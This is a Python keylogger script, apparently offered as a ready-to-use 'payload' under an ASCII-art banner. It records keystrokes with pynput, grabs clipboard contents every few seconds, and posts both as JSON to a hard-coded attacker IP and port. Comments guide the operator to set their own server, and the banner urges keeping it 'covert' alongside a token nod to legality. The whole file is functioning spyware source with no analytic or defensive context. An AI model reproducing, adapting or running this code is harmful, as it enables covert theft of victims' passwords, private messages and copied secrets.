"""
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄  
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███ 
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███ 
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███ 
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███ 
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███ 
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███ 
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Payload)
  ▀                ███    ███              ▀                    
                                                   Zephyr
                                                   
Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
"""

from pynput import keyboard
import requests
import json
import threading
import pyperclip  # Add this import

keystrokes = ""  # Global variable to store captured keystrokes
clipboard_data = ""  # Global variable to store clipboard content

server_ip = "192.168.213.174"  # Change this based on your attacker IP
server_port = 8080  # Change this based on your specified port
send_interval = 5  # Interval (in seconds) between sending keystrokes to the server (Change if you want)

# Track whether Ctrl, Alt, Shift is pressed
ctrl_pressed = False
alt_pressed = False
shift_pressed = False

def send_data():
    try:
        # Create payload with keystrokes and clipboard data in JSON format
        payload = json.dumps({"keyboardData": keystrokes, "clipboardData": clipboard_data})
        # Send POST request to the server with the keystrokes and clipboard data
        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
        # Schedule next call to send_data function after specified interval
        timer = threading.Timer(send_interval, send_data)
        timer.start()
    except:
        print("Couldn't complete request!")

def handle_keystrokes(key):
    global keystrokes, ctrl_pressed, alt_pressed, shift_pressed

    try:
        if key == keyboard.Key.enter:
            keystrokes += "\n"  # Add newline character for Enter key
        elif key == keyboard.Key.tab:
            keystrokes += "\t"  # Add tab character for Tab key
        elif key == keyboard.Key.space:
            keystrokes += " "  # Add space for Space key
        elif key == keyboard.Key.backspace:
            if len(keystrokes) > 0:
                keystrokes = keystrokes[:-1]  # Remove last character for Backspace key
        elif key == keyboard.Key.esc:
            return False  # Stop listener when Esc key is pressed
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            alt_pressed = True
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
            shift_pressed = True
        else:
            # Ignore specific key combinations like Ctrl+C (copy), Ctrl+V (paste), etc.
            if not (ctrl_pressed or alt_pressed):
                keystrokes += str(key).strip("'")  # Add other keys to keystrokes, stripping extra quotes
    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key):
    global ctrl_pressed, alt_pressed, shift_pressed

    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        alt_pressed = False
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
        shift_pressed = False

def capture_clipboard():
    global clipboard_data
    clipboard_data = pyperclip.paste()  # Capture current clipboard content
    # Schedule next clipboard capture after specified interval
    threading.Timer(send_interval, capture_clipboard).start()

# Set up and start the keyboard listener
with keyboard.Listener(on_press=handle_keystrokes, on_release=on_release) as listener:
    send_data()
    capture_clipboard()  # Start capturing clipboard data
    listener.join()
